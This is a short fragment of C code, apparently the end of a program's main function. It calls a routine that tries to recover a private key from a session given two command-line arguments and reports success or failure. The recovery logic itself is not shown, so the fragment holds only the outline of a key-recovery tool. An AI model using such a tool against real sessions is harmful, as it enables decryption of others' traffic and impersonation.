   if (!recover_private_key(argv[1], argv[2]))
   {
      fprintf(stderr, "\tIt is not possible to recover the private key from this session\n");
      exit(0);
   }
   else
   {
      printf("Private key successfully found\n");
   }

   exit(0);
}
